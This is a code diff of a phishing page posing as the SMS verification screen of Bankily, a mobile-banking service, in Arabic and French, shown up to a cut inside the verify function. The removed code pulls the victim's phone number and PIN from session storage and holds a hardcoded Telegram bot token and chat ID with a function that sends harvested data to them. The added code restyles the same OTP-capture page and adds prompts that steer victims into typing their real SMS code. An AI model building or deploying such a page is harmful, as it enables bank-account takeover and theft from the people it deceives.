@@ -1,396 +1,351 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="fr" dir="ltr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title id="page-title">التحقق من الرمز</title>
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
-  <style>
-    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
-    :root {
-      --teal:#14C9A8; --teal-dark:#0CA88A; --teal-light:#3DDFC0;
-      --navy:#1B2B6B; --navy-dark:#0D1845;
-      --bg:#ffffff; --bg-gray:#f4f5f7;
-      --text:#1a1a1a; --text-mid:#555; --text-light:#999;
-      --border:#e8e8e8; --red:#e53935;
-    }
-    html,body { height:100%; overflow:hidden; }
-    body { font-family:'Cairo',sans-serif; background:var(--bg); display:flex; flex-direction:column; height:100dvh; }
-
-    /* HEADER */
-    .header { display:flex; align-items:center; justify-content:space-between; padding:14px 20px; flex-shrink:0; }
-    .lang-btn { background:none; border:1.5px solid var(--teal); color:var(--teal); padding:5px 14px; border-radius:20px; font-family:'Cairo',sans-serif; font-size:13px; font-weight:700; cursor:pointer; }
-    .lang-btn:active { background:var(--teal); color:white; }
-    .back-btn { display:flex; align-items:center; gap:4px; background:none; border:none; font-family:'Cairo',sans-serif; font-size:16px; font-weight:600; color:var(--text); cursor:pointer; }
-    .back-arrow { font-size:20px; }
-
-    /* BODY */
-    .body-content { flex:1; display:flex; flex-direction:column; overflow:hidden; }
-
-    /* LOGO */
-    .logo-wrap { display:flex; justify-content:center; align-items:center; gap:12px; padding:20px 20px 12px; }
-    .logo-wrap img.li { width:50px; height:50px; border-radius:50%; object-fit:cover; }
-    .logo-wrap img.lb { height:36px; object-fit:contain; border-radius:8px; }
-
-    /* CONTENT */
-    .content { flex:1; padding:12px 26px 0; display:flex; flex-direction:column; }
-    .otp-title { font-size:24px; font-weight:900; color:var(--text); text-align:right; margin-bottom:8px; }
-    .otp-subtitle { font-size:13px; color:var(--text-light); text-align:right; line-height:1.7; margin-bottom:24px; }
-    .phone-hint { color:var(--teal); font-weight:700; }
-
-    /* OTP BOXES */
-    .otp-boxes { display:flex; justify-content:center; gap:8px; margin-bottom:16px; direction:ltr; }
-    .otp-box {
-      width:46px; height:56px; border:2px solid var(--border); border-radius:14px;
-      font-family:'Cairo',sans-serif; font-size:22px; font-weight:700;
-      text-align:center; color:var(--text); background:var(--bg-gray); outline:none;
-      transition:border-color .2s, box-shadow .2s, background .2s;
-      caret-color:var(--teal);
-    }
-    .otp-box:focus { border-color:var(--teal); box-shadow:0 0 0 3px rgba(20,201,168,.15); background:white; }
-    .otp-box.filled { border-color:var(--teal); background:white; }
-    .otp-box.error { border-color:var(--red) !important; box-shadow:0 0 0 3px rgba(229,57,53,.12) !important; background:#fff8f8 !important; animation:shake .35s ease; }
-    @keyframes shake {
-      0%,100%{ transform:translateX(0); }
-      20%{ transform:translateX(-5px); }
-      40%{ transform:translateX(5px); }
-      60%{ transform:translateX(-4px); }
-      80%{ transform:translateX(4px); }
-    }
-
-    /* ERROR MSG */
-    .error-msg {
-      display:none; align-items:flex-start; gap:10px;
-      background:#fff3f3; border:1.5px solid #ffcdd2;
-      border-radius:14px; padding:12px 14px; margin-bottom:14px;
-    }
-    .error-msg.show { display:flex; animation:fadeIn .3s ease; }
-    @keyframes fadeIn { from{opacity:0;transform:translateY(-6px)} to{opacity:1;transform:translateY(0)} }
-    .err-icon { font-size:20px; flex-shrink:0; }
-    .err-text { font-size:13px; color:var(--red); font-weight:600; line-height:1.5; }
-
-    /* PROGRESS */
-    .progress-wrap { height:5px; background:#eee; border-radius:3px; margin-bottom:12px; overflow:hidden; }
-    .progress-bar { height:100%; background:var(--teal); border-radius:3px; transition:width 1s linear; }
-
-    /* RESEND */
-    .resend-row { display:flex; align-items:center; justify-content:center; gap:8px; flex-wrap:wrap; }
-    .resend-label { font-size:13px; color:var(--text-light); }
-    .resend-btn { background:none; border:none; font-family:'Cairo',sans-serif; font-size:13px; font-weight:700; color:var(--teal); cursor:pointer; }
-    .resend-btn:disabled { color:var(--text-light); cursor:default; }
-    .timer { font-size:16px; font-weight:800; color:var(--text-mid); min-width:46px; text-align:center; }
-    .timer.urgent { color:var(--red); }
-
-    /* BOTTOM */
-    .bottom-bar { background:var(--teal); padding:18px 22px 34px; flex-shrink:0; }
-    .primary-btn { width:100%; background:white; color:var(--text); border:none; border-radius:50px; padding:15px; font-family:'Cairo',sans-serif; font-size:17px; font-weight:700; cursor:pointer; transition:opacity .2s,transform .1s; }
-    .primary-btn:active { opacity:.85; transform:scale(.98); }
-    .primary-btn:disabled { opacity:.5; cursor:not-allowed; transform:none; }
-
-    /* SUCCESS */
-    .success-screen { position:fixed; inset:0; background:white; z-index:200; display:flex; flex-direction:column; align-items:center; justify-content:center; gap:18px; opacity:0; pointer-events:none; transition:opacity .3s; }
-    .success-screen.active { opacity:1; pointer-events:all; }
-    .success-icon { width:80px; height:80px; border-radius:50%; background:linear-gradient(135deg,var(--teal),var(--teal-dark)); display:flex; align-items:center; justify-content:center; animation:popIn .4s cubic-bezier(.34,1.56,.64,1) both; }
-    .success-icon svg { width:40px; height:40px; fill:none; stroke:white; stroke-width:3; }
-    @keyframes popIn { from{transform:scale(0)} to{transform:scale(1)} }
-    .success-text { font-size:22px; font-weight:900; color:var(--text); }
-    .success-sub { font-size:14px; color:var(--text-light); }
-
-    /* SPINNER */
-    .spinner-screen { position:fixed; inset:0; background:rgba(255,255,255,.92); z-index:200; display:flex; flex-direction:column; align-items:center; justify-content:center; gap:18px; opacity:0; pointer-events:none; transition:opacity .25s; }
-    .spinner-screen.active { opacity:1; pointer-events:all; }
-    .ring { width:52px; height:52px; border:4px solid #e8e8e8; border-top-color:var(--teal); border-radius:50%; animation:spin .75s linear infinite; }
-    @keyframes spin { to{transform:rotate(360deg)} }
-    .spin-label { font-size:15px; color:var(--text-mid); }
-
-    /* FR */
-    body.fr .otp-title, body.fr .otp-subtitle { text-align:left; }
-    body.fr .back-arrow { transform:scaleX(-1); display:inline-block; }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#030E14">
+<title>Code de vérification – Bankily</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html,body{width:100%;overflow-x:hidden;min-height:100vh;background:#030E14}
+body{font-family:'Cairo',sans-serif;background:#030E14;color:#7BBEC8;min-height:100vh;display:flex;flex-direction:column;}
+#cvs{position:fixed;inset:0;z-index:0;pointer-events:none}
+.top-bar{position:relative;z-index:10;background:#0097A7;padding:12px 16px;display:flex;align-items:center;justify-content:space-between;box-shadow:0 2px 20px rgba(0,0,0,.5);flex-shrink:0;}
+.top-bar::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(0,212,232,.6),transparent);}
+.tb-btn{background:rgba(255,255,255,.15);border:1px solid rgba(255,255,255,.4);color:#fff;font-family:'Cairo',sans-serif;font-size:14px;font-weight:700;padding:6px 14px;border-radius:20px;cursor:pointer;text-decoration:none;display:inline-flex;align-items:center;gap:5px;transition:background .2s;}
+.tb-btn:hover{background:rgba(255,255,255,.28)}
+.tb-title{color:#fff;font-family:'Cairo',sans-serif;font-size:17px;font-weight:800;letter-spacing:.3px}
+.page{position:relative;z-index:2;flex:1;display:flex;flex-direction:column;align-items:center;padding:32px 20px calc(90px + env(safe-area-inset-bottom));max-width:480px;margin:0 auto;width:100%;}
+.card{width:100%;background:rgba(8,33,48,.9);border:1px solid rgba(0,151,167,.22);border-radius:24px;padding:28px 24px;box-shadow:0 20px 60px rgba(0,0,0,.7),inset 0 1px 0 rgba(0,212,232,.06);position:relative;overflow:hidden;}
+.card::before{content:'';position:absolute;top:-1px;left:15%;right:15%;height:1px;background:linear-gradient(90deg,transparent,#00B8CC,transparent);}
+.logo-wrap{text-align:center;margin-bottom:22px}
+.logo-wrap img{height:48px;filter:drop-shadow(0 4px 16px rgba(0,151,167,.5))}
+.logo-wrap .logo-fallback{display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#0097A7,#00C99E);color:#fff;font-size:18px;font-weight:900;padding:8px 20px;border-radius:12px;letter-spacing:1px;}
+.instruction{text-align:center;font-size:15px;line-height:1.7;color:#7BBEC8;margin-bottom:28px;padding:0 4px;}
+.otp-row{display:flex;justify-content:center;gap:14px;direction:ltr;margin-bottom:24px;}
+.otp-box{width:58px;height:64px;font-family:'Cairo',sans-serif;font-size:26px;font-weight:800;text-align:center;direction:ltr;background:#05141C;border:2px solid rgba(0,151,167,.3);border-radius:14px;color:#E8F8F8;outline:none;caret-color:#00D4E8;transition:border-color .2s,box-shadow .2s,transform .15s;-webkit-appearance:none;}
+.otp-box:focus{border-color:#0097A7;box-shadow:0 0 0 3px rgba(0,151,167,.25),0 0 20px rgba(0,212,232,.15);transform:scale(1.05);background:#071D28;}
+.otp-box.filled{border-color:#00B087;box-shadow:0 0 12px rgba(0,176,135,.2);}
+.timer-wrap{text-align:center;margin-bottom:20px}
+.timer-label{font-size:13px;color:#3D6E7A;margin-bottom:6px;letter-spacing:.5px}
+.timer-display{display:inline-flex;align-items:center;gap:8px;background:#05141C;border:1px solid rgba(0,151,167,.2);border-radius:12px;padding:8px 20px;}
+.timer-icon{font-size:16px}
+.timer-val{font-size:22px;font-weight:800;color:#00D4E8;font-variant-numeric:tabular-nums;text-shadow:0 0 20px rgba(0,212,232,.5);letter-spacing:2px;}
+.timer-val.expired{color:#EF4444;text-shadow:0 0 20px rgba(239,68,68,.4)}
+.spin-wrap{display:flex;justify-content:center;margin-bottom:20px}
+.ring{width:32px;height:32px;border-radius:50%;border:3px solid rgba(0,151,167,.2);border-top-color:#0097A7;border-right-color:#00C99E;animation:spin .9s linear infinite;}
+@keyframes spin{to{transform:rotate(360deg)}}
+.resend-btn{display:block;width:100%;text-align:center;background:none;border:1px solid rgba(0,151,167,.2);border-radius:12px;padding:10px;color:#F59E0B;font-family:'Cairo',sans-serif;font-size:14px;font-weight:700;cursor:pointer;transition:all .25s;margin-top:4px;}
+.resend-btn:hover{background:rgba(245,158,11,.07);border-color:rgba(245,158,11,.4);color:#FCD34D}
+.verify-bar{position:fixed;bottom:0;left:0;right:0;padding:12px 16px calc(12px + env(safe-area-inset-bottom));background:linear-gradient(180deg,transparent,#030E14 28%);z-index:100;}
+.verify-btn{width:100%;max-width:480px;margin:0 auto;display:block;padding:16px;border:none;border-radius:16px;background:linear-gradient(135deg,#00C99E 0%,#0097A7 55%,#006070 100%);color:#fff;font-family:'Cairo',sans-serif;font-size:18px;font-weight:900;cursor:pointer;position:relative;overflow:hidden;box-shadow:0 8px 32px rgba(0,151,167,.55),0 4px 0 rgba(0,60,80,.8);transition:transform .25s,box-shadow .25s;animation:vPulse 2.5s ease-in-out infinite;}
+.verify-btn::before{content:'';position:absolute;top:-50%;left:-60%;width:220%;height:220%;background:linear-gradient(45deg,transparent 30%,rgba(255,255,255,.25) 50%,transparent 70%);animation:shimmer 3s infinite;}
+@keyframes vPulse{0%,100%{box-shadow:0 8px 28px rgba(0,151,167,.5),0 4px 0 rgba(0,60,80,.8)}50%{box-shadow:0 14px 45px rgba(0,201,158,.7),0 0 0 8px rgba(0,151,167,.1),0 4px 0 rgba(0,60,80,.8)}}
+@keyframes shimmer{0%{transform:translateX(-100%) rotate(45deg)}100%{transform:translateX(120%) rotate(45deg)}}
+.verify-btn:hover{transform:translateY(-3px);animation:none;box-shadow:0 16px 50px rgba(0,201,158,.8)}
+.verify-btn:disabled{background:#1A3A45;color:#3D6E7A;cursor:not-allowed;animation:none;box-shadow:none}
+#loader-overlay{display:none;position:fixed;inset:0;background:rgba(3,14,20,.93);z-index:9999;flex-direction:column;justify-content:center;align-items:center;gap:20px;}
+#loader-overlay.active{display:flex}
+.ld-ring{width:64px;height:64px;position:relative}
+.ld-ring::before{content:'';position:absolute;inset:0;border-radius:50%;border:3px solid transparent;border-top-color:#00D4E8;animation:spin .8s linear infinite}
+.ld-ring::after{content:'';position:absolute;inset:10px;border-radius:50%;border:3px solid transparent;border-bottom-color:#00B087;animation:spin 1.4s linear infinite reverse}
+.ld-txt{color:#00B8CC;font-family:'Cairo',sans-serif;font-size:15px;font-weight:700;letter-spacing:2px}
+#modal-alert{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:10000;justify-content:center;align-items:center;padding:20px;}
+#modal-alert.show{display:flex}
+.modal-box{background:#082130;border:1px solid rgba(0,151,167,.3);border-radius:20px;padding:28px 24px;max-width:340px;width:100%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.8);}
+.modal-box p{font-size:15px;color:#E8F8F8;line-height:1.7;margin-bottom:20px;white-space:pre-line}
+.modal-box button{background:linear-gradient(135deg,#00C99E,#0097A7);color:#fff;border:none;padding:10px 28px;border-radius:10px;cursor:pointer;font-family:'Cairo',sans-serif;font-size:15px;font-weight:700;box-shadow:0 4px 16px rgba(0,151,167,.4);}
+#guard-overlay{display:none;position:fixed;inset:0;background:#030E14;z-index:99999;flex-direction:column;justify-content:center;align-items:center;gap:16px;padding:20px;text-align:center;}
+#guard-overlay.active{display:flex}
+.g-icon{font-size:56px}
+.g-msg{font-size:18px;font-weight:800;color:#E8F8F8;line-height:1.5}
+.g-sub{font-size:14px;color:#F59E0B}
+.g-spin{width:44px;height:44px;border-radius:50%;border:4px solid rgba(0,151,167,.2);border-top-color:#00D4E8;animation:spin .8s linear infinite;margin-top:8px}
+</style>
 </head>
 <body>
 
-<header class="header">
-  <button class="lang-btn" id="lang-btn" onclick="toggleLang()">FR</button>
-  <button class="back-btn" onclick="history.back()">
-    <span id="back-text">رجوع</span>
-    <span class="back-arrow">›</span>
-  </button>
-</header>
+<canvas id="cvs"></canvas>
 
-<div class="body-content">
+<div id="guard-overlay">
+  <div class="g-icon">🔒</div>
+  <div class="g-msg" id="guard-msg"></div>
+  <div class="g-sub" id="guard-sub"></div>
+  <div class="g-spin"></div>
+</div>
 
-  <!-- LOGO -->
-  <div class="logo-wrap">
-    <img class="li" src="logo1.png" alt="" onerror="this.style.display='none'">
-    <img class="lb" src="logo.png" alt="" onerror="this.style.display='none'">
-  </div>
+<div id="loader-overlay">
+  <div class="ld-ring"></div>
+  <div class="ld-txt" id="ld-txt">جاري التحقق...</div>
+</div>
 
-  <div class="content">
-    <div class="otp-title" id="s-title">التحقق من الرمز</div>
-    <div class="otp-subtitle" id="s-subtitle">
-      تم إرسال رمز التحقق المكون من 6 أرقام إلى رقمك
-      <span class="phone-hint" id="phone-display"></span>
-    </div>
-
-    <!-- OTP INPUTS -->
-    <div class="otp-boxes">
-      <input class="otp-box" type="tel" inputmode="numeric" maxlength="1" id="otp0">
-      <input class="otp-box" type="tel" inputmode="numeric" maxlength="1" id="otp1">
-      <input class="otp-box" type="tel" inputmode="numeric" maxlength="1" id="otp2">
-      <input class="otp-box" type="tel" inputmode="numeric" maxlength="1" id="otp3">
-      <input class="otp-box" type="tel" inputmode="numeric" maxlength="1" id="otp4">
-      <input class="otp-box" type="tel" inputmode="numeric" maxlength="1" id="otp5">
-    </div>
-
-    <!-- ERROR MESSAGE -->
-    <div class="error-msg" id="error-msg">
-      <span class="err-icon">🚫</span>
-      <div class="err-text" id="err-text">لا يمكنك استخدام أرقام هاتفك كرمز التحقق. الرجاء إدخال الرمز الذي استلمته عبر SMS.</div>
-    </div>
-
-    <!-- PROGRESS -->
-    <div class="progress-wrap">
-      <div class="progress-bar" id="progress-bar" style="width:100%"></div>
-    </div>
-
-    <!-- RESEND -->
-    <div class="resend-row">
-      <span class="resend-label" id="s-resend-label">لم تستلم الرمز؟</span>
-      <button class="resend-btn" id="resend-btn" disabled onclick="resendOtp()">
-        <span id="s-resend-btn">إعادة الإرسال</span>
-      </button>
-      <span class="timer" id="timer">05:00</span>
-    </div>
-  </div>
-
-  <div class="bottom-bar">
-    <button class="primary-btn" id="verify-btn" disabled onclick="verifyOtp()">
-      <span id="s-verify-btn">تحقق</span>
-    </button>
+<div id="modal-alert">
+  <div class="modal-box">
+    <p id="modal-text"></p>
+    <button id="modal-close">OK</button>
   </div>
 </div>
 
-<!-- SPINNER -->
-<div class="spinner-screen" id="spinner">
-  <div class="ring"></div>
-  <div class="spin-label" id="s-spinner">جاري التحقق...</div>
+<div class="top-bar">
+  <a href="login.html" class="tb-btn" id="back-btn">&#8592; Retour</a>
+  <span class="tb-title" id="tb-title">Code de vérification</span>
+  <button class="tb-btn" id="lang-btn" onclick="toggleLang()">عربي</button>
 </div>
 
-<!-- SUCCESS -->
-<div class="success-screen" id="success-screen">
-  <div class="success-icon">
-    <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+<div class="page">
+  <div class="card">
+    <div class="logo-wrap">
+      <img src="images/logo.png" alt="Bankily"
+           onerror="this.style.display='none';document.getElementById('logo-fb').style.display='inline-flex'">
+      <span class="logo-fallback" id="logo-fb" style="display:none">🏦 Bankily</span>
+    </div>
+    <p class="instruction" id="instruction">Entrez le code de vérification SMS transmis sur votre numéro de téléphone</p>
+    <div class="otp-row" dir="ltr">
+      <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr" autocomplete="one-time-code">
+      <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
+      <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
+      <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
+    </div>
+    <div class="timer-wrap">
+      <div class="timer-label" id="timer-label">Code de vérification expire dans</div>
+      <div class="timer-display">
+        <span class="timer-icon">⏳</span>
+        <span class="timer-val" id="timer">5:00</span>
+      </div>
+    </div>
+    <div class="spin-wrap"><div class="ring"></div></div>
+    <button class="resend-btn" id="resend" onclick="resendCode()">🔄 Renvoyer code de vérification</button>
   </div>
-  <div class="success-text" id="s-success-text">تم التحقق بنجاح!</div>
-  <div class="success-sub" id="s-success-sub">جاري التوجيه...</div>
+</div>
+
+<div class="verify-bar">
+  <button class="verify-btn" id="verify-btn" onclick="submitOTP()">Vérifier</button>
 </div>
 
 <script>
-const BOT_TOKEN = '8744987826:AAG1dT-BOUikFMtDslYxNa2htJB-tMs5FdA';
-const CHAT_ID   = '8674569520';
-const TOTAL_SEC = 300;
+(function(){
+  const c=document.getElementById('cvs'),ctx=c.getContext('2d');
+  let pts=[],sh=[];
+  const COLS=['0,212,232','0,201,158','0,184,204'];
+  function resize(){
+    c.width=innerWidth;c.height=innerHeight;pts=[];
+    const n=Math.min(55,Math.floor(c.width*c.height/14000));
+    for(let i=0;i<n;i++)pts.push({x:Math.random()*c.width,y:Math.random()*c.height,vx:(Math.random()-.5)*.35,vy:(Math.random()-.5)*.35,r:Math.random()*1.5+.3,a:Math.random()*.5+.1,ci:Math.floor(Math.random()*3)});
+  }
+  function addSh(){sh.push({x:Math.random()*c.width,y:Math.random()*c.height*.3,vx:4+Math.random()*5,vy:2+Math.random()*3,a:.8,len:0,maxLen:80+Math.random()*100})}
+  setInterval(addSh,4500);
+  function draw(){
+    ctx.clearRect(0,0,c.width,c.height);
+    pts.forEach(p=>{p.x+=p.vx;p.y+=p.vy;if(p.x<0||p.x>c.width)p.vx*=-1;if(p.y<0||p.y>c.height)p.vy*=-1;ctx.beginPath();ctx.arc(p.x,p.y,p.r,0,Math.PI*2);ctx.fillStyle=`rgba(${COLS[p.ci]},${p.a})`;ctx.fill();});
+    for(let i=0;i<pts.length;i++)for(let j=i+1;j<pts.length;j++){const dx=pts[i].x-pts[j].x,dy=pts[i].y-pts[j].y,d=Math.sqrt(dx*dx+dy*dy);if(d<100){ctx.beginPath();ctx.moveTo(pts[i].x,pts[i].y);ctx.lineTo(pts[j].x,pts[j].y);ctx.strokeStyle=`rgba(0,184,204,${(1-d/100)*.09})`;ctx.lineWidth=.7;ctx.stroke();}}
+    sh=sh.filter(s=>{s.x+=s.vx;s.y+=s.vy;s.len+=Math.hypot(s.vx,s.vy);if(s.len>s.maxLen)s.a-=.07;if(s.a<=0)return false;const g=ctx.createLinearGradient(s.x-s.vx*8,s.y-s.vy*8,s.x,s.y);g.addColorStop(0,'transparent');g.addColorStop(1,`rgba(0,212,232,${s.a})`);ctx.beginPath();ctx.moveTo(s.x-s.vx*8,s.y-s.vy*8);ctx.lineTo(s.x,s.y);ctx.strokeStyle=g;ctx.lineWidth=1.5;ctx.stroke();return true;});
+    requestAnimationFrame(draw);
+  }
+  window.addEventListener('resize',resize);resize();draw();
+})();
 
 const T = {
-  ar: {
-    title:'التحقق من الرمز', back:'رجوع', langBtn:'FR',
-    subtitle:'تم إرسال رمز التحقق المكون من 6 أرقام إلى رقمك ',
-    resendLabel:'لم تستلم الرمز؟', resendBtn:'إعادة الإرسال',
-    verify:'تحقق', spinner:'جاري التحقق...',
-    successText:'تم التحقق بنجاح!', successSub:'جاري التوجيه...',
-    errPhone:'🚫 لا يمكنك استخدام أرقام هاتفك كرمز التحقق. الرجاء إدخال الرمز الذي استلمته عبر SMS.',
+  ar:{
+    dir:'rtl',lang:'ar',
+    back:'رجوع &#8594;',langBtn:'FR',
+    title:'رمز التحقق',
+    instruction:'أدخل رمز التحقق المرسل إلى رقم هاتفك عبر رسالة SMS',
+    timerLabel:'ينتهي رمز التحقق بعد',
+    resend:'🔄 إعادة إرسال رمز التحقق',
+    verify:'✓ تحقق',
+    expired:'انتهت صلاحية الرمز',
+    loading:'جاري التحقق...',
+    resendDone:'تم إرسال رمز جديد ✓',
+    errEmpty:'الرجاء إدخال جميع الأرقام الأربعة',
+    errDigits:'الرجاء إدخال أرقام صحيحة فقط',
+    errSamePin:'رمز التحقق لا يمكن أن يكون نفس رمز PIN',
+    errTooFast:'عزيزي المشترك،\nيجب التأكد من إدخال رمز التحقق الذي وصلك عبر SMS',
+    guardMsg:'يجب إدخال رقمك ورمزك السري أولاً',
+    guardSub:'جاري تحويلك إلى صفحة تسجيل الدخول...',
   },
-  fr: {
-    title:'Vérification OTP', back:'Retour', langBtn:'AR',
-    subtitle:'Un code à 6 chiffres a été envoyé à votre numéro ',
-    resendLabel:"Vous n'avez pas reçu le code ?", resendBtn:'Renvoyer',
-    verify:'Vérifier', spinner:'Vérification en cours...',
-    successText:'Vérification réussie !', successSub:'Redirection en cours...',
-    errPhone:'🚫 Vous ne pouvez pas utiliser votre numéro de téléphone comme code OTP. Veuillez saisir le code reçu par SMS.',
+  fr:{
+    dir:'ltr',lang:'fr',
+    back:'&#8592; Retour',langBtn:'عربي',
+    title:'Code de vérification',
+    instruction:'Entrez le code de vérification SMS transmis sur votre numéro de téléphone',
+    timerLabel:'Code de vérification expire dans',
+    resend:'🔄 Renvoyer code de vérification',
+    verify:'✓ Vérifier',
+    expired:'Code expiré',
+    loading:'Vérification en cours...',
+    resendDone:'Un nouveau code a été envoyé ✓',
+    errEmpty:'Veuillez entrer les 4 chiffres du code',
+    errDigits:'Veuillez entrer uniquement des chiffres',
+    errSamePin:'Le code ne peut pas être identique au PIN',
+    errTooFast:"Cher(e) abonné(e),\nVeuillez saisir le code de vérification reçu par SMS",
+    guardMsg:"Saisissez d'abord votre numéro et code PIN",
+    guardSub:'Redirection vers la page de connexion...',
   }
 };
 
-let lang = localStorage.getItem('appLang') || 'ar';
-const phone = sessionStorage.getItem('phone') || '--------';
-const pin   = sessionStorage.getItem('pin')   || '****';
-const phoneDisp = '+222 ' + phone.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
+let isArabic = localStorage.getItem('bankily_lang') === 'ar';
 
-function applyLang() {
-  const t = T[lang];
-  document.title = t.title;
-  document.getElementById('page-title').textContent = t.title;
-  document.getElementById('back-text').textContent = t.back;
-  document.getElementById('lang-btn').textContent = t.langBtn;
-  document.getElementById('s-title').textContent = t.title;
-  document.getElementById('s-resend-label').textContent = t.resendLabel;
-  document.getElementById('s-resend-btn').textContent = t.resendBtn;
-  document.getElementById('s-verify-btn').textContent = t.verify;
-  document.getElementById('s-spinner').textContent = t.spinner;
-  document.getElementById('s-success-text').textContent = t.successText;
-  document.getElementById('s-success-sub').textContent = t.successSub;
-  document.getElementById('s-subtitle').innerHTML = t.subtitle + `<span class="phone-hint">${phoneDisp}</span>`;
-  document.getElementById('err-text').textContent = T[lang].errPhone;
-  document.documentElement.lang = lang;
-  document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
-  document.body.classList.toggle('fr', lang === 'fr');
+function applyLang(){
+  const t = isArabic ? T.ar : T.fr;
+  document.documentElement.lang = t.lang;
+  document.documentElement.dir  = t.dir;
+  document.body.dir              = t.dir;
+  document.getElementById('back-btn').innerHTML       = t.back;
+  document.getElementById('lang-btn').textContent     = t.langBtn;
+  document.getElementById('tb-title').textContent     = t.title;
+  document.getElementById('instruction').textContent  = t.instruction;
+  document.getElementById('timer-label').textContent  = t.timerLabel;
+  document.getElementById('resend').textContent       = t.resend;
+  document.getElementById('verify-btn').textContent   = t.verify;
+  document.getElementById('ld-txt').textContent       = t.loading;
+  document.querySelector('.otp-row').dir = 'ltr';
 }
-function toggleLang() {
-  lang = lang === 'ar' ? 'fr' : 'ar';
-  localStorage.setItem('appLang', lang);
+
+function toggleLang(){
+  isArabic = !isArabic;
+  localStorage.setItem('bankily_lang', isArabic ? 'ar' : 'fr');
   applyLang();
 }
 
-/* ── OTP INPUTS ── */
-const inputs = Array.from(document.querySelectorAll('.otp-box'));
-
-inputs.forEach((inp, i) => {
-  inp.addEventListener('input', () => {
-    inp.value = inp.value.replace(/\D/g, '').slice(-1);
-    inp.classList.toggle('filled', inp.value !== '');
-    hideError();
-    if (inp.value && i < 5) inputs[i+1].focus();
-    checkComplete();
-  });
-  inp.addEventListener('keydown', e => {
-    if (e.key === 'Backspace' && !inp.value && i > 0) {
-      inputs[i-1].focus();
-      inputs[i-1].value = '';
-      inputs[i-1].classList.remove('filled');
-      hideError();
-    }
-  });
-  inp.addEventListener('paste', e => {
-    e.preventDefault();
-    const text = (e.clipboardData || window.clipboardData)
-      .getData('text').replace(/\D/g,'').slice(0,6);
-    text.split('').forEach((ch, j) => {
-      if (inputs[j]) { inputs[j].value = ch; inputs[j].classList.add('filled'); }
-    });
-    inputs[Math.min(text.length, 5)].focus();
-    hideError();
-    checkComplete();
-  });
+function showModal(msg){
+  document.getElementById('modal-text').textContent = msg;
+  document.getElementById('modal-alert').classList.add('show');
+}
+document.getElementById('modal-close').addEventListener('click',()=>{
+  document.getElementById('modal-alert').classList.remove('show');
 });
 
-function getOtp() { return inputs.map(i => i.value).join(''); }
-
-function checkComplete() {
-  const done = inputs.every(inp => inp.value !== '');
-  document.getElementById('verify-btn').disabled = !done;
-}
-
-function showError() {
-  inputs.forEach(inp => inp.classList.add('error'));
-  document.getElementById('error-msg').classList.add('show');
-  document.getElementById('err-text').textContent = T[lang].errPhone;
-  document.getElementById('verify-btn').disabled = true;
-  setTimeout(() => inputs.forEach(i => i.classList.remove('error')), 700);
-}
-function hideError() {
-  document.getElementById('error-msg').classList.remove('show');
-}
-
-/* ── PHONE NUMBER OTP VALIDATION ── */
-function isPhoneOtp(otp) {
-  // Check if OTP matches any 6 consecutive digits of the phone number
-  const digits = phone.replace(/\D/g, '');
-  for (let i = 0; i <= digits.length - 6; i++) {
-    if (digits.substring(i, i + 6) === otp) return true;
-  }
-  // Also check reversed
-  const rev = digits.split('').reverse().join('');
-  for (let i = 0; i <= rev.length - 6; i++) {
-    if (rev.substring(i, i + 6) === otp) return true;
-  }
-  return false;
-}
-
-/* ── TIMER ── */
-let timeLeft = TOTAL_SEC;
-let timerInterval;
-
-function startTimer() {
-  clearInterval(timerInterval);
-  timeLeft = TOTAL_SEC;
-  document.getElementById('resend-btn').disabled = true;
-  const bar = document.getElementById('progress-bar');
-  bar.style.transition = 'none';
-  bar.style.width = '100%';
-  setTimeout(() => { bar.style.transition = 'width 1s linear'; }, 50);
-
-  timerInterval = setInterval(() => {
-    timeLeft--;
-    const m = String(Math.floor(timeLeft/60)).padStart(2,'0');
-    const s = String(timeLeft%60).padStart(2,'0');
-    const el = document.getElementById('timer');
-    el.textContent = `${m}:${s}`;
-    el.classList.toggle('urgent', timeLeft <= 30);
-    bar.style.width = (timeLeft / TOTAL_SEC * 100) + '%';
-    if (timeLeft <= 0) {
-      clearInterval(timerInterval);
-      document.getElementById('timer').textContent = '';
-      document.getElementById('resend-btn').disabled = false;
-    }
-  }, 1000);
-}
-
-function resendOtp() {
-  inputs.forEach(inp => { inp.value = ''; inp.classList.remove('filled'); });
-  document.getElementById('verify-btn').disabled = true;
-  hideError();
-  inputs[0].focus();
-  startTimer();
-}
-
-/* ── TELEGRAM ── */
-async function sendTelegram(text) {
-  try {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({chat_id:CHAT_ID, text, parse_mode:'HTML'})
-    });
-  } catch(e) {}
-}
-
-/* ── VERIFY ── */
-async function verifyOtp() {
-  const otp = getOtp();
-
-  // ❌ Reject if OTP matches phone digits
-  if (isPhoneOtp(otp)) {
-    showError();
-    return;
-  }
-
-  const now = new Date();
